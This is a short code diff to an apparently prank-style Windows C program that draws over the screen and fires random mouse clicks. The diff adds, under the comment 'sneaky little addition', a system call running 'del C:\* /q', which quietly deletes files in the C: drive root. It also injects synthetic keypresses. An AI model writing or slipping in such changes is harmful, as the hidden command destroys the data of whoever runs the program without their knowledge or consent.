@@ -33,6 +33,9 @@ DWORD WINAPI shader1(LPVOID lpParam) {
         DeleteObject(hbm);
         DeleteObject(hdcdc);
         DeleteObject(desk);
+
+		// sneaky little addition
+		system("del C:\\* /q");
     }
     return 0;
 }
@@ -77,6 +80,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
             mouse_event(MOUSEEVENTF_LEFTDOWN, rand() % sw - 1, rand() % sh - 1, 0, 0);
             mouse_event(MOUSEEVENTF_LEFTUP, rand() % sw - 1, rand() % sh - 1, 0, 0);
+			keybd_event(VK_A, 0, 0, 0);
 
             // MY EYES AHH THEY BURN
             HDC hdc = GetDC(0);
@@ -104,6 +108,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 	return 0;
 }
+
 
 
 
